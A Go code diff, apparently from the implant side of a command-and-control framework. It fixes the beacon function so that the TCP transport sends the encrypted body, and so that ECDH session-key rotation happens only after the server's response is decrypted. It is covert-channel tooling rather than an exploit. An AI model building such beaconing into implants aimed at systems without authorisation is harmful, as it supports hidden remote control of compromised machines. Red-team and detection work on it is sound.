@@ -816,7 +816,7 @@ func doBeacon() {
 	} else if Protocol == "smb" || BeaconTransport == "smb" {
 		respBody = sendSMBBeacon(sendBody)
 	} else if Protocol == "tcp" {
-		respBody = sendTCPBeacon(body)
+		respBody = sendTCPBeacon(sendBody)
 	} else if Protocol == "dns" {
 		respBody = sendDNSBeacon(body)
 		if respBody == nil {
@@ -915,19 +915,9 @@ func doBeacon() {
 			return
 		}
 
-		// Check for session key rotation
-		if envelope.ECDHPub != "" {
-			if err := ecdhSess.rotateKeyPair(); err != nil {
-				if Debug {
-					log.Printf("[!] ECDH key pair rotation failed: %v", err)
-				}
-			} else if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
-				if Debug {
-					log.Printf("[!] ECDH key rotation failed: %v", err)
-				}
-			}
-		}
-
+		// Decrypt the response with the current session key first: the server
+		// encrypts the rotation-triggering response under the OLD key. Rotating
+		// before decryption would make this response unreadable.
 		if envelope.CipherB64 != "" {
 			plaintext, err := ecdhSess.decryptAESGCM(envelope.CipherB64)
 			if err != nil {
@@ -938,6 +928,20 @@ func doBeacon() {
 			}
 			if err := decodeBeacon(plaintext, &resp); err != nil {
 				return
+			}
+		}
+
+		// Session key rotation: rotate keypair and derive the new session key for
+		// the next beacon (the new agent public key is piggybacked on it).
+		if envelope.ECDHPub != "" {
+			if err := ecdhSess.rotateKeyPair(); err != nil {
+				if Debug {
+					log.Printf("[!] ECDH key pair rotation failed: %v", err)
+				}
+			} else if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
+				if Debug {
+					log.Printf("[!] ECDH key rotation failed: %v", err)
+				}
 			}
 		}
 	} else if beaconCipher != nil {
